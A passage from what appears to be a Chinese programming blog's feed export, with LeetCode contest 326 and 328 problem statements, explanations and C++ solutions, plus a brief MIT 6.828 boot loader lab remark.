&#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6279-数组乘积中的不同质因数数目"><a href="#6279-数组乘积中的不同质因数数目" class="headerlink" title="6279. 数组乘积中的不同质因数数目"></a>6279. 数组乘积中的不同质因数数目</h3><p>给你一个正整数数组 <code>nums</code> ，对 <code>nums</code> 所有元素求积之后，找出并返回乘积中 <strong>不同质因数</strong> 的数目。</p>
<p><strong>注意：</strong></p>
<ul>
<li><strong>质数</strong> 是指大于 <code>1</code> 且仅能被 <code>1</code> 及自身整除的数字。</li>
<li>如果 <code>val2 / val1</code> 是一个整数，则整数 <code>val1</code> 是另一个整数 <code>val2</code> 的一个因数。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,4,3,7,10,6]</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">nums 中所有元素的乘积是：2 * 4 * 3 * 7 * 10 * 6 = 10080 = 25 * 32 * 5 * 7 。</span><br><span class="line">共有 4 个不同的质因数，所以返回 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,4,8,16]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">nums 中所有元素的乘积是：2 * 4 * 8 * 16 = 1024 = 210 。</span><br><span class="line">共有 1 个不同的质因数，所以返回 1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 104</code></li>
<li><code>2 &lt;= nums[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-326/problems/distinct-prime-factors-of-product-of-array/">https://leetcode.cn/contest/weekly-contest-326/problems/distinct-prime-factors-of-product-of-array/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>素数筛选法
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们可以筛选出所有属于 $[1,1000]$ 范围的质数，然后对数组中的每个元素求其含有的质因子的数目。可以利用 $O(n)$ 的时间复杂度筛选出所有的素数。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \max(nums))$，其中 $n$ 为数组中的元素，$\max(nums)$ 表示数组中元素的最大值。</li>
<li>空间复杂度：$O(\max(nums))$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">distinctPrimeFactors</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxVal = *<span class="built_in">max_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; primer;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(maxVal + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= maxVal + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visit[i]) &#123;</span><br><span class="line">                primer.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= maxVal + <span class="number">1</span>; j += i) &#123;</span><br><span class="line">                    visit[j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> p : primer) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x % p == <span class="number">0</span>) &#123;</span><br><span class="line">                    cnt.<span class="built_in">emplace</span>(p);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6196-将字符串分割成值不超过-K-的子字符串"><a href="#6196-将字符串分割成值不超过-K-的子字符串" class="headerlink" title="6196. 将字符串分割成值不超过 K 的子字符串"></a>6196. 将字符串分割成值不超过 K 的子字符串</h3><p>给你一个字符串 <code>s</code> ，它每一位都是 <code>1</code> 到 <code>9</code> 之间的数字组成，同时给你一个整数 <code>k</code> 。</p>
<p>如果一个字符串 <code>s</code> 的分割满足以下条件，我们称它是一个 <strong>好</strong> 分割：</p>
<ul>
<li><code>s</code> 中每个数位 <strong>恰好</strong> 属于一个子字符串。</li>
<li>每个子字符串的值都小于等于 <code>k</code> 。</li>
</ul>
<p>请你返回 <code>s</code> 所有的 <strong>好</strong> 分割中，子字符串的 <strong>最少</strong> 数目。如果不存在 <code>s</code> 的 <strong>好</strong> 分割，返回 <code>-1</code> 。</p>
<p><strong>注意：</strong></p>
<ul>
<li>一个字符串的 <strong>值</strong> 是这个字符串对应的整数。比方说，<code>&quot;123&quot;</code> 的值为 <code>123</code> ，<code>&quot;1&quot;</code> 的值是 <code>1</code> 。</li>
<li><strong>子字符串</strong> 是字符串中一段连续的字符序列。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;165462&quot;, k = 60</span><br><span class="line">输出：4</span><br><span class="line">解释：我们将字符串分割成子字符串 &quot;16&quot; ，&quot;54&quot; ，&quot;6&quot; 和 &quot;2&quot; 。每个子字符串的值都小于等于 k = 60 。</span><br><span class="line">不存在小于 4 个子字符串的好分割。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;238182&quot;, k = 5</span><br><span class="line">输出：-1</span><br><span class="line">解释：这个字符串不存在好分割。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s[i]</code> 是 <code>&#39;1&#39;</code> 到 <code>&#39;9&#39;</code> 之间的数字。</li>
<li><code>1 &lt;= k &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-326/problems/partition-string-into-substrings-with-values-at-most-k/">https://leetcode.cn/contest/weekly-contest-326/problems/partition-string-into-substrings-with-values-at-most-k/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目要求分割的连续子字符串越少越好，那么我们就要求每个字符串尽可能的大，那么明显的贪心算法，我们只需要尽可能的让每个子字符串尽可能的接近 $k$ 即可。需要注意的是，如果当前单个字符的大小已经小于 $k$，此时我们应该返回 $-1$。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumPartition</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; curr * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span> &lt;= k) &#123;</span><br><span class="line">                curr = curr * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                i++;</span><br><span class="line">                tot++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (tot == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6280-范围内最接近的两个质数"><a href="#6280-范围内最接近的两个质数" class="headerlink" title="6280. 范围内最接近的两个质数"></a>6280. 范围内最接近的两个质数</h3><p>给你两个正整数 <code>left</code> 和 <code>right</code> ，请你找到两个整数 <code>num1</code> 和 <code>num2</code> ，它们满足：</p>
<ul>
<li><code>left &lt;= nums1 &lt; nums2 &lt;= right </code> 。</li>
<li><code>nums1</code> 和 <code>nums2</code> 都是 <strong>质数</strong> 。</li>
<li><code>nums2 - nums1</code> 是满足上述条件的质数对中的 <strong>最小值</strong> 。</li>
</ul>
<p>请你返回正整数数组 <code>ans = [nums1, nums2]</code> 。如果有多个整数对满足上述条件，请你返回 <code>nums1</code> 最小的质数对。如果不存在符合题意的质数对，请你返回 <code>[-1, -1]</code> 。</p>
<p>如果一个整数大于 <code>1</code> ，且只能被 <code>1</code> 和它自己整除，那么它是一个质数。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：left = 10, right = 19</span><br><span class="line">输出：[11,13]</span><br><span class="line">解释：10 到 19 之间的质数为 11 ，13 ，17 和 19 。</span><br><span class="line">质数对的最小差值是 2 ，[11,13] 和 [17,19] 都可以得到最小差值。</span><br><span class="line">由于 11 比 17 小，我们返回第一个质数对。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：left = 4, right = 6</span><br><span class="line">输出：[-1,-1]</span><br><span class="line">解释：给定范围内只有一个质数，所以题目条件无法被满足。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= left &lt;= right &lt;= 106</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-326/problems/closest-prime-numbers-in-range/">https://leetcode.cn/contest/weekly-contest-326/problems/closest-prime-numbers-in-range/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 素数筛选</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目给定的数的范围为 $[1,10^6]$，这就表明我们可以直接利用素数筛选法，将 $[1,10^6]$ 以内的质数全部求出来即可。我们求出所有的素数以后然后求出相邻大小的素数的最小值即可，此时即可按照题目要求求出满足要求的最小素数对。当然这个即为最小孪生素数的经典数学题目。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示 $right$。我们可以利用经典的素数筛选法求出给定范围的素数即可。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示 $right$，我们需要保存所有小于等于 $right$ 的素数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">closestPrimes</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; primer;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(right + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visit[i]) &#123;</span><br><span class="line">                primer.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= right; j += i) &#123;</span><br><span class="line">                    visit[j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="type">int</span> mindiff = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; primer.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (primer[i - <span class="number">1</span>] &gt;= left &amp;&amp; primer[i] &lt;= right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (primer[i] - primer[i - <span class="number">1</span>] &lt; mindiff) &#123;</span><br><span class="line">                    res = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(&#123;primer[i - <span class="number">1</span>], primer[i]&#125;);</span><br><span class="line">                    mindiff = primer[i] - primer[i - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.828】lab1 boot loader</title>
    <url>/2022/12/29/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/85/</url>
    <content><![CDATA[<h2 id="MIT-6-828-lab11-boot-loader"><a href="#MIT-6-828-lab11-boot-loader" class="headerlink" title="MIT 6.828 lab11 boot loader"></a>MIT 6.828 lab11 boot loader</h2><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总的来说这个 <code>lab</code> 还是非常有挑战性的，是个好的 <code>lab</code>，但是 <code>lab</code> 本身的代码倒不是很难，我觉得后面还是有机会仔细做一下 <code>mit6.828</code> 的 <code>lab</code>。我以为完成驱动代码需要非常多的技巧和文档需要阅读，结果代码量实在太少了。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.828</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 328</title>
    <url>/2023/01/23/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/94/</url>
    <content><![CDATA[<h2 id="leetcode-leetcode-contest-328"><a href="#leetcode-leetcode-contest-328" class="headerlink" title="leetcode leetcode contest 328"></a>leetcode leetcode contest 328</h2><p>双周赛的题目确实非常高，还是有许多题目自己不太会。</p>
<h3 id="6291-数组元素和与数字和的绝对差"><a href="#6291-数组元素和与数字和的绝对差" class="headerlink" title="6291. 数组元素和与数字和的绝对差"></a>6291. 数组元素和与数字和的绝对差</h3><p>元素和 是 <code>nums</code> 中的所有元素相加求和。<br>数字和 是 <code>nums</code> 中每一个元素的每一数位（重复数位需多次求和）相加求和。<br>返回 元素和 与 数字和 的绝对差。</p>
<p>注意：两个整数 <code>x</code> 和 <code>y</code> 的绝对差定义为 <code>|x - y|</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,15,6,3]</span><br><span class="line">输出：9</span><br><span class="line">解释：</span><br><span class="line">nums 的元素和是 1 + 15 + 6 + 3 = 25 。</span><br><span class="line">nums 的数字和是 1 + 1 + 5 + 6 + 3 = 16 。</span><br><span class="line">元素和与数字和的绝对差是 |25 - 16| = 9 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">nums 的元素和是 1 + 2 + 3 + 4 = 10 。</span><br><span class="line">nums 的数字和是 1 + 2 + 3 + 4 = 10 。</span><br><span class="line">元素和与数字和的绝对差是 |10 - 10| = 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 2000</code></li>
<li><code>1 &lt;= nums[i] &lt;= 2000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-328/problems/difference-between-element-sum-and-digit-sum-of-an-array/">https://leetcode.cn/contest/weekly-contest-328/problems/difference-between-element-sum-and-digit-sum-of-an-array/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接求每一位数字的数字和即可，然后求数组中所有数字的和即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log \max(nums))$。其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">differenceOfSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum1 = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> sum2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            <span class="keyword">while</span> (v != <span class="number">0</span>) &#123;</span><br><span class="line">                sum2 += (v % <span class="number">10</span>);</span><br><span class="line">                v /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">abs</span>(sum1 - sum2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6292-子矩阵元素加-1"><a href="#6292-子矩阵元素加-1" class="headerlink" title="6292. 子矩阵元素加 1"></a>6292. 子矩阵元素加 1</h3><p>给你一个正整数 <code>n</code> ，表示最初有一个 <code>n x n</code> 、下标从 <code>0</code> 开始的整数矩阵 <code>mat</code> ，矩阵中填满了 <code>0</code> 。</p>
<p>另给你一个二维整数数组 <code>query </code>。针对每个查询 <code>query[i] = [row1i, col1i, row2i, col2i]</code> ，请你执行下述操作：</p>
<p>找出 左上角 为 <code>(row1i, col1i)</code> 且 右下角 为 <code>(row2i, col2i)</code> 的子矩阵，将子矩阵中的 每个元素 加 <code>1</code> 。也就是给所有满足 <code>row1i &lt;= x &lt;= row2i</code> 和 <code>col1i &lt;= y &lt;= col2i</code> 的 <code>mat[x][y]</code> 加 <code>1</code> 。<br>返回执行完所有操作后得到的矩阵 <code>mat</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, queries = [[1,1,2,2],[0,0,1,1]]</span><br><span class="line">输出：[[1,1,0],[1,2,1],[0,1,1]]</span><br><span class="line">解释：上图所展示的分别是：初始矩阵、执行完第一个操作后的矩阵、执行完第二个操作后的矩阵。</span><br><span class="line">- 第一个操作：将左上角为 (1, 1) 且右下角为 (2, 2) 的子矩阵中的每个元素加 1 。 </span><br><span class="line">- 第二个操作：将左上角为 (0, 0) 且右下角为 (1, 1) 的子矩阵中的每个元素加 1 。 </span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2, queries = [[0,0,1,1]]</span><br><span class="line">输出：[[1,1],[1,1]]</span><br><span class="line">解释：上图所展示的分别是：初始矩阵、执行完第一个操作后的矩阵。 </span><br><span class="line">- 第一个操作：将矩阵中的每个元素加 1 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 500</code></li>
<li><code>1 &lt;= queries.length &lt;= 104</code></li>
<li><code>0 &lt;= row1i &lt;= row2i &lt; n</code></li>
<li><code>0 &lt;= col1i &lt;= col2i &lt; n</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-328/problems/increment-submatrices-by-one/">https://leetcode.cn/contest/weekly-contest-328/problems/increment-submatrices-by-one/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>差分数组
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目初看起来比较复杂，实际我们可以计算每行的差分数组，即可计算出每个元素的数值。每个查询时，我们将 $[row1i,row2i]$ 中每一行的查分数组进行更新即可。或者直接使用二维差分数组，详细题解参考:<a href="https://leetcode.cn/problems/range-sum-query-2d-immutable/solutions/627420/er-wei-qu-yu-he-jian-suo-ju-zhen-bu-ke-b-2z5n/">题解</a></li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nq)$，其中 $n$ 为给定的 $n$，$q$ 表示数组的长度。</li>
<li>空间复杂度：$O(n^2)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li><p>一维差分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">rangeAddQueries</span>(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries) &#123;</span><br><span class="line">        <span class="type">int</span> m = queries.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">cnt</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = queries[i][<span class="number">0</span>], y1 = queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> x2 = queries[i][<span class="number">2</span>], y2 = queries[i][<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = x1; j &lt;= x2; j++) &#123;</span><br><span class="line">                cnt[j][y1]++;</span><br><span class="line">                cnt[j][y2 + <span class="number">1</span>]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">res</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                curr += cnt[i][j];</span><br><span class="line">                res[i][j] = curr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>二维差分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">rangeAddQueries</span>(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries) &#123;</span><br><span class="line">        <span class="comment">// 二维差分数组</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">diff</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>));  <span class="comment">// +1 是为了避免特殊处理横纵坐标为 n 的点</span></span><br><span class="line">        <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;&amp; q: queries) &#123;</span><br><span class="line">            <span class="type">int</span> row1 = q[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> col1 = q[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> row2 = q[<span class="number">2</span>] + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> col2 = q[<span class="number">3</span>] + <span class="number">1</span>;</span><br><span class="line">            diff[row1][col1]++;</span><br><span class="line">            diff[row1][col2]--;</span><br><span class="line">            diff[row2][col1]--;</span><br><span class="line">            diff[row2][col2]++;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 二维前缀和</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">res</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        <span class="comment">// 第一个数</span></span><br><span class="line">        res[<span class="number">0</span>][<span class="number">0</span>] = diff[<span class="number">0</span>][<span class="number">0</span>];  </span><br><span class="line">        <span class="comment">// 第一行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;  </span><br><span class="line">            res[<span class="number">0</span>][j] += res[<span class="number">0</span>][j - <span class="number">1</span>] + diff[<span class="number">0</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 其余行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            res[i][<span class="number">0</span>] = res[i - <span class="number">1</span>][<span class="number">0</span>] + diff[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                res[i][j] = res[i - <span class="number">1</span>][j] + res[i][j - <span class="number">1</span>] - res[i - <span class="number">1</span>][j - <span class="number">1</span>] </span><br><span class="line">                            + diff[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6293-统计好子数组的数目"><a href="#6293-统计好子数组的数目" class="headerlink" title="6293. 统计好子数组的数目"></a>6293. 统计好子数组的数目</h3><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你返回 <code>nums</code> 中 好 子数组的数目。</p>
